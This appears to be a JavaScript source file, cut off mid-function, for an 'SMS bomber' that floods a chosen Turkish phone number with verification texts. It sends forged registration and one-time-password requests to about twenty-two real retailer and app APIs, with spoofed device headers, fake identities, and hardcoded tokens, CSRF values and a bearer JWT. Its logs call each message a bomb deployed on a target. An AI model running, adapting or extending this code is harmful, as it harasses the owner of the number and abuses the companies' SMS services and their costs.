/*

https://github.com/egehan0250/Sms_Bomber_Api/blob/main/functions/sms.js adresinden alınmıştır.

*/


async function delaySystem(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function smsBomber(phone, amount) {
    let systemFinishedT = false;
    console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] `) + 
               chalk.red("🎯 [BOMBER]") + 
               chalk.yellow(` Deploying ${amount} SMS bombs to target: +90${phone}`));
    
    const queryPromise = new Promise(async (resolve, reject) => {
        try {
            let dataSb = {
                startDate: Date.now(),
                phone: phone,
                amount: amount,
                total: 0,
                success: 0,
                error: 0,
            };

            // 1. KahveDunyasi
async function KahveDunyasi(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Language-Id": "tr-TR", "X-Client-Platform": "web",
            "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/"
        },
        json: { "countryCode": "90", "phoneNumber": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.processStatus === "Success") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [KahveDunyasi] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [KahveDunyasi] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 2. Wmf
async function Wmf(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://www.wmf.com.tr/users/register/",
        form: {
            "confirm": "true", "date_of_birth": "1956-03-01", "email": mail,
            "email_allowed": "true", "first_name": "Memati", "gender": "male",
            "last_name": "Bas", "password": "31ABC..abc31", "phone": "0" + no
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 202) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Wmf] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Wmf] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 3. Bim
async function Bim(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://bim.veesk.net:443/service/v1.0/account/login",
        json: { "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Bim] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Bim] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 4. Englishhome
async function Englishhome(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://www.englishhome.com:443/api/member/sendOtp",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "*/*", "Content-Type": "application/json",
            "Origin": "https://www.englishhome.com", "Referer": "https://www.englishhome.com/"
        },
        json: { "Phone": no, "XID": "" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.isError === false) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Englishhome] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Englishhome] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 5. Suiste
async function Suiste(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://suiste.com:443/api/auth/code",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json",
            "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone",
            "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
            "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1"
        },
        form: {
            "action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
            "full_name": "Memati Bas", "gsm": no, "is_advertisement": "1",
            "is_contract": "1", "password": "31MeMaTi31"
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.code === "common.success") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Suiste] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Suiste] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 6. KimGb
async function KimGb(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
        json: { "msisdn": "90" + no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [KimGb] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [KimGb] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 7. Evidea
async function Evidea(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi";
    const data = `--${boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${mail}\r\n--${boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--${boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${no}\r\n--${boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${boundary}--\r\n`;
    request.post({
        url: "https://www.evidea.com:443/users/register/",
        headers: {
            "Content-Type": `multipart/form-data; boundary=${boundary}`,
            "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile", "X-App-Device": "ios",
            "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
            "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
        },
        body: data,
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 202) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Evidea] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Evidea] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 8. Ucdortbes
async function Ucdortbes(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.345dijital.com:443/api/users/register",
        headers: {
            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
            "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Authorization": "null", "Connection": "close"
        },
        json: { "email": "", "name": "Memati", "phoneNumber": "+90" + no, "surname": "Bas" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.error === "E-Posta veya telefon zaten kayıtlı!") {
                dataSb.error++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Ucdortbes] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
            } else {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Ucdortbes] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            }
        } catch (e) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Ucdortbes] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        }
    });
}

// 9. TiklaGelsin
async function TiklaGelsin(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://svc.apps.tiklagelsin.com:443/user/graphql",
        headers: {
            "Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
            "Appversion": "2.4.1", "X-No-Auth": "true",
            "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"
        },
        json: {
            "operationName": "GENERATE_OTP",
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
            "variables": { "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": "+90" + no }
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.data && res.data.generateOtp === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [TiklaGelsin] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [TiklaGelsin] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 10. Naosstars
async function Naosstars(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
        headers: {
            "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "Locale": "en-TR", "Version": "1.0030",
            "Os": "ios", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios",
            "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Content-Type": "application/json; charset=utf-8", "Apitype": "mobile_app"
        },
        json: { "telephone": "+90" + no, "type": "register" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Naosstars] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Naosstars] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 11. Koton
async function Koton(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk";
    const data = `--${boundary}\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--${boundary}\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--${boundary}\r\ncontent-disposition: form-data; name="email"\r\n\r\n${mail}\r\n--${boundary}\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--${boundary}\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${no}\r\n--${boundary}\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n1993-07-02\r\n--${boundary}\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--${boundary}\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--${boundary}--\r\n`;
    request.post({
        url: "https://www.koton.com:443/users/register/",
        headers: {
            "Content-Type": `multipart/form-data; boundary=${boundary}`,
            "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile", "X-App-Device": "ios",
            "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
        },
        body: data,
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 202) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Koton] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Koton] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 12. Hayatsu
async function Hayatsu(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
            "Origin": "https://www.hayatsu.com.tr", "Referer": "https://www.hayatsu.com.tr/"
        },
        form: { "mobilePhoneNumber": no, "actionType": "register" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.is_success === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Hayatsu] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Hayatsu] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 13. Hizliecza
async function Hizliecza(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://prod.hizliecza.net:443/mobil/account/sendOTP",
        headers: {
            "Accept": "application/json", "Content-Type": "application/json",
            "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Authorization": "Bearer null"
        },
        json: { "otpOperationType": 1, "phoneNumber": "+90" + no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Hizliecza] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Hizliecza] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 14. Metro
async function Metro(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json; charset=utf-8",
            "Applicationversion": "2.4.1", "Applicationplatform": "2",
            "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"
        },
        json: { "methodType": "2", "mobilePhoneNumber": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.status === "success") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Metro] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Metro] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 15. File
async function File(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.filemarket.com.tr:443/v1/otp/send",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json",
            "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "X-Os": "IOS", "X-Version": "1.7"
        },
        json: { "mobilePhoneNumber": "90" + no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.responseType === "SUCCESS") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [File] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [File] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 16. Akasya
async function Akasya(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://akasyaapi.poilabs.com:443/v1/en/sms",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json",
            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
            "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1"
        },
        json: { "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.result === "SMS sended succesfully!") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Akasya] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Akasya] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 17. Akbati
async function Akbati(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://akbatiapi.poilabs.com:443/v1/en/sms",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json",
            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3",
            "User-Agent": "Akdbat"
        },
        json: { "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.result === "SMS sended succesfully!") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Akbati] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Akbati] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 18. Komagene
async function Komagene(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Content-Type": "application/json", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6",
            "Firmaid": "32", "Origin": "https://www.komagene.com.tr", "Referer": "https://www.komagene.com.tr/",
            "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq"
        },
        json: { "FirmaId": 32, "Telefon": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.Success === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Komagene] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Komagene] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 19. Porty
async function Porty(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://panel.porty.tech:443/api.php?",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
        },
        json: { "job": "start_login", "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.status === "success") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Porty] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Porty] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 20. Tasdelen
async function Tasdelen(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://tasdelen.sufirmam.com:3300/mobile/send-otp",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json",
            "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3"
        },
        json: { "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.result === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Tasdelen] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Tasdelen] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 21. Uysal
async function Uysal(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://www.uysalmarket.com.tr", "Referer": "https://www.uysalmarket.com.tr/"
        },
        json: { "phone_number": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Uysal] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Uysal] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 22. Yapp
async function Yapp(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://yapp.com.tr:443/api/mobile/v1/register",
        headers: {
            "Accept": "application/json", "Content-Type": "application/json",
            "X-Content-Language": "en", "Authorization": "Bearer ",
            "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)"
        },
        json: {
            "app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5",
            "device_name": "Memati", "device_type": "I", "device_version": "15.8.3",
            "email": mail, "firstname": "Memati", "is_allow_to_communication": "1",
            "language_id": "2", "lastname": "Bas", "phone_number": no, "sms_code": ""
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Yapp] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
